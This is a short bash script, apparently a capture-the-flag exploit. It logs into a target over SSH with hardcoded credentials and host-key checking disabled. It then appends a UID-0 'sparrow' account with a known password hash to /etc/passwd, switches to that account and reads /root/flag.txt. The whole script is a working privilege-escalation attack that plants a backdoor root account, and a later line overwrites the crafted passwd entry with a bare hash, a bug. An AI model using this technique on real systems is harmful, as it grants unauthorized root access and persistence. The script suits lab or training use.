#!/bin/bash

# Generate any tipe of password hash
generated_passwd=$(mkpasswd -m SHA-512 sparrow)
passwd="sparrow:$generated_passwd:0:0:Sparrow:/root:/bin/bash"

# Hash example
passwd="\$6\$d3PyMB0M\$KMrLIrQ8lMnmxZRd2qEVdStQUjvDRFiKYvlH1.jhdqIJe.a2caa6zymb5RjbS0cvs0J0eOyJ1ZK4rBQfdbMqk0"
echo "Generated password: $passwd"

if [ -z "$1" ]
then
    echo "No IP supplied. Please provide the target IP address!"
else
    sshpass -pYvFWPeC7sTWJdaYQ ssh -o StrictHostKeyChecking=no jack@$1 -p 2022 "echo $passwd >> /etc/passwd && echo "sparrow" | su -c \"cat /root/flag.txt\" sparrow"
fi